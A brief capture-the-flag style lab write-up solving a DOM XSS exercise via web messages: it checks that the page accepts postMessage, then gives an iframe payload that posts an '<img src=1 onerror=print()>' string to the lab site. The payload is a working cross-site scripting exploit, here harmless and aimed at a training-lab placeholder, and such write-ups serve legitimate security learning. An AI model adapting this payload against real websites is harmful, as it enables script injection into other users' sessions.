#2 Lab: DOM XSS using web messages

    1.In console type window.postMessage('Hello hacker'); and see the response in console.
    It means that the website is accepting web messages and there is a possibility of DOM XSS vulnerability.
    2.Go to exploit server and add the following payload,
       <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
    and lab is solved.
